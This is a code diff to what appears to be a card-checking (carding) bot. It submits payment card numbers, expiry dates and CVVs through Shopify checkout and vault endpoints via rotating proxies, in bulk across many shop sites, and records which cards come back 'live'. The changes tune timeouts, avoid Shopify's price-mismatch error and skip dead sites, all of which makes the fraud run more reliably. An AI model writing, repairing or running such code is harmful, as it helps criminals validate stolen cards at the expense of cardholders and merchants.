@@ -52,7 +52,7 @@ book = {
 TIMEOUT_PRODUCT_FETCH = 10
 TIMEOUT_CHECKOUT = 22
 TIMEOUT_GRAPHQL = 10
-TIMEOUT_VAULT = 7
+TIMEOUT_VAULT = 10
 
 # =========== LIVE RESPONSE CODES ===============
 _LIVE_CODES = (
@@ -827,9 +827,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     if payment_method.get('name') or payment_method.get('paymentMethodIdentifier'):
                         payment_identifier = payment_method.get('paymentMethodIdentifier')
                         gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
-                        total_price = str(float(running_total) + shipping_amount + tax_amount)
-                        # Use Shopify-confirmed merchandise price to avoid MERCHANDISE_EXPECTED_PRICE_MISMATCH
-                        confirmed_merch_price = str(round(float(running_total) - shipping_amount - tax_amount, 2))
+                        total_price = str(round(float(running_total) + shipping_amount + tax_amount, 2))
+                        # Use Shopify-confirmed merchandise line totalAmount to avoid MERCHANDISE_EXPECTED_PRICE_MISMATCH
+                        try:
+                            merch_lines = seller_proposal.get('merchandise', {}).get('merchandiseLines', [])
+                            line_total = merch_lines[0].get('totalAmount', {}).get('value', {}).get('amount') if merch_lines else None
+                            confirmed_merch_price = str(round(float(line_total), 2)) if line_total else str(round(float(running_total), 2))
+                        except (KeyError, TypeError, ValueError, IndexError):
+                            confirmed_merch_price = str(round(float(running_total), 2))
                         break
             if not payment_identifier:
                 return False, "No valid payment method found", gateway, total_price, currency
@@ -874,7 +879,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             }
             if ident_sig:
                 vault_headers['shopify-identification-signature'] = ident_sig
-            vault_timeout = aiohttp.ClientTimeout(total=TIMEOUT_VAULT, connect=5)
+            vault_timeout = aiohttp.ClientTimeout(total=TIMEOUT_VAULT, connect=7)
             token = None
             for v_attempt in range(3):
                 try:
@@ -2255,9 +2260,11 @@ async def _run_bulk_check(user_id, event, pending):
                 except asyncio.QueueEmpty:
                     break
                 current_proxies = load_proxies(user_id)
-                if not filtered_sites or not current_proxies:
+                live_sites = [s for s in filtered_sites if s['url'].rstrip('/') not in _dead_sites_cache]
+                active_sites = live_sites if live_sites else filtered_sites
+                if not active_sites or not current_proxies:
                     break
-                res = await check_card_with_retry(card, filtered_sites, current_proxies, max_retries=1)
+                res = await check_card_with_retry(card, active_sites, current_proxies, max_retries=1)
                 all_results['checked'] += 1
                 all_results['last_card'] = card
                 all_results['last_response'] = res.get('message', '—')
